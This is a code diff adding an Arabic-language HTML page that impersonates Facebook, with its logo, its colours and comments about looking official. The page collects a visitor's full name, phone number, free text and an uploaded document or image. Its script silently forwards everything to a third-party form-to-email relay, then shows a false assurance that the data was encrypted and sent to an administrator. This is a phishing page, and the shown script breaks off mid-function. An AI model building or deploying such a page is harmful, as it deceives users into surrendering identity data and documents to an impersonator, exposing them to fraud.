@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة تسجيل البيانات الرسمية</title>
+    <!-- استدعاء خط رسمي من جوجل ليعطي طابع احترافي وموثوق -->
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com/css2?family=Cairo:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        /* --- الأنماط والتصميم (CSS) بنظام الهوية الرسمية --- */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Cairo', sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5; /* لون خلفية فيسبوك الرسمية الفاتحة */
+            color: #1c1e21;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+        }
+
+        /* تصميم الكرت الرئيسي المستوحى من واجهات تسجيل الدخول الرسمية */
+        .form-card, .success-card {
+            background: #ffffff;
+            border: none;
+            border-radius: 8px;
+            padding: 30px 24px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            transition: all 0.4s ease;
+        }
+
+        .card-header {
+            text-align: center;
+            margin-bottom: 25px;
+            border-bottom: 1px solid #e4e6eb;
+            padding-bottom: 20px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #1877f2; /* لون أزرق فيسبوك الرسمي */
+            letter-spacing: -1px;
+            margin-bottom: 8px;
+        }
+
+        .card-header h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1c1e21;
+            margin-bottom: 6px;
+        }
+
+        .card-header p {
+            color: #606770;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        /* تنسيق حقول الإدخال */
+        .input-group {
+            margin-bottom: 18px;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13.5px;
+            color: #1c1e21;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+
+        .input-group input[type="text"],
+        .input-group input[type="tel"],
+        .input-group textarea {
+            width: 100%;
+            padding: 14px 16px;
+            background: #f5f6f7;
+            border: 1px solid #ccd0d5;
+            border-radius: 6px;
+            color: #1c1e21;
+            font-size: 15px;
+            outline: none;
+            transition: all 0.2s ease;
+        }
+
+        /* تخصيص حقل رفع الملفات بشكل رسمي */
+        .input-group input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            background: #fff;
+            border: 1px dashed #1877f2;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 13px;
+        }
+
+        /* التأثير الأزرق الاحترافي عند الضغط على الحقول */
+        .input-group input:focus, 
+        .input-group textarea:focus {
+            border-color: #1877f2;
+            background: #fff;
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        /* زر الإرسال الأزرق العريض */
+        button[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            background: #1877f2;
+            color: #ffffff;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.2s ease;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        button[type="submit"]:hover {
+            background: #166fe5;
+        }
+
+        button[type="submit"]:disabled {
+            background: #e4e6eb;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+
+        /* واجهة كرت النجاح */
+        .success-card {
+            text-align: center;
+            padding: 40px 24px;
+        }
+
+        .success-icon {
+            width: 60px;
+            height: 60px;
+            background: #e7f3ff;
+            color: #1877f2;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 30px;
+            margin: 0 auto 20px auto;
+        }
+
+        .success-card h3 {
+            font-size: 22px;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+
+        .success-card p {
+            color: #606770;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .reload-btn {
+            width: 100%;
+            padding: 12px;
+            background: #e4e6eb;
+            border: none;
+            color: #4b4f56;
+            font-weight: 600;
+            font-size: 15px;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .reload-btn:hover {
+            background: #d8dadf;
+        }
+
+        /* فئات إخفاء العناصر المساعدة */
+        .hidden {
+            display: none !important;
+        }
+
+        /* تأثير دائرة الانتظار عند الإرسال */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- 1. صندوق تعبئة البيانات الرئيسي -->
+        <div class="form-card" id="formCard">
+            <div class="card-header">
+                <div class="logo">facebook</div>
+                <h2>بوابة إدارة البيانات الموحدة</h2>
+                <p>يرجى استكمال الحقول المطلوبة لضمان توجيه طلبك إلى القسم المختص بأمان.</p>
+            </div>
+
+            <!-- النموذج متصل مباشرة بإيميلك ومجهّز لاستقبال الملفات (enctype) -->
+            <form id="officialForm" action="https://formsubmit.co" method="POST" enctype="multipart/form-data">
+                
+                <!-- ميزات لحماية وتأمين انسيابية النموذج في الخلفية -->
+                <input type="hidden" name="_captcha" value="false">
+                
+                <div class="input-group">
+                    <label for="name">الاسم الكامل</label>
+                    <input type="text" id="name" name="اسم_المستخدم" placeholder="أدخل اسمك كما هو مسجل رسميّاً" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="phone">رقم الهاتف</label>
+                    <input type="tel" id="phone" name="رقم_الهاتف" placeholder="مثال: 009639xxxxxxxx" required>
+                </div>
+
+                <div class="input-group">
+                    <label for="message">البيانات والنص المطلوب</label>
+                    <textarea id="message" name="نص_الرسالة" rows="4" placeholder="اكتب المحتوى أو النص الذي ترغب بإرساله..." required></textarea>
+                </div>
+
+                <div class="input-group">
+                    <label for="attachment">إرفاق وثيقة أو صورة (اختياري)</label>
+                    <input type="file" id="attachment" name="الملف_المرفق">
+                </div>
+
+                <button type="submit" id="submitBtn">
+                    <span class="spinner" id="spinner"></span>
+                    <span class="btn-text">تأكيد وإرسال البيانات</span>
+                </button>
+            </form>
+        </div>
+
+        <!-- 2. صندوق النجاح التلقائي بعد الإرسال -->
+        <div class="success-card hidden" id="successCard">
+            <div class="success-icon">✓</div>
+            <h3>تمت العملية بنجاح</h3>
+            <p>نشكرك على إدخال البيانات. تم تشفير النص وحفظ المرفقات، وإرسالها فوراً إلى البريد الإلكتروني للمسؤول الشخصي المباشر.</p>
+            <button onclick="window.location.reload()" class="reload-btn">إنشاء نموذج جديد</button>
+        </div>
+    </div>
+
+    <!-- --- كود الجافا سكريبت الذكي (JavaScript) لتأمين المعالجة في الخلفية --- -->
+    <script>
+        document.getElementById('officialForm').addEventListener('submit', async function(e) {
+            e.preventDefault(); // منع المتصفح من تحديث الصفحة لضمان تجربة مستخدم سلسة
+
+            const form = this;
+            const submitBtn = document.getElementById('submitBtn');
+            const spinner = document.getElementById('spinner');
+            const formCard = document.getElementById('formCard');
+            const successCard = document.getElementById('successCard');
+
+            // تفعيل مظهر الانتظار الرسمي أثناء رفع الملفات وإرسال الإيميل
+            spinner.style.display = 'block';
+            submitBtn.disabled = true;
+
+            // تجميع محتويات النموذج بما فيها الملفات المرفقة
+            const formData = new FormData(form);
+
+            try {
+                // إرسال البيانات بشكل صامت عبر تقنية الأجاكس (Fetch API)
+                const response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData,
+                    headers: {
+                        'Accept': 'application/json'
+                    }
+                });
+
+                if (response.ok) {
+                    // تبديل الواجهات عند نجاح الإرسال دون مغادرة الموقع أبداً
+                    formCard.classList.add('hidden');
+                    successCard.classList.remove('hidden');
+                } else {
+                    alert('عذراً، فشل الاتصال بالخادم السحابي الخارجي. يرجى المحاولة لاحقاً.');
+                    resetInterface();
